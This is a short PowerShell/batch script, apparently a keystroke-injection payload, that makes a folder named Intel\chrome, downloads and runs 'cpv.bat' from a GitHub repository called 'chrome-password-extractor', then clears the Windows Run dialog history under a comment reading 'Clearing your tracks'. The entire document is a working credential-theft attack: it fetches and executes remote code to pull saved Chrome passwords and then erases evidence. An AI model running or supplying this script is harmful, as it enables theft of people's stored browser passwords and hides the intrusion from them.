cd /;md Intel;cd Intel;md chrome;cd chrome;
wget https://raw.githubusercontent.com/exploitechx/chrome-password-extractor/master/cpv.bat -OutFile cpv.bat
start cpv.bat

 // --> Clearing your tracks


Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -ErrorAction SilentlyContinue

exit
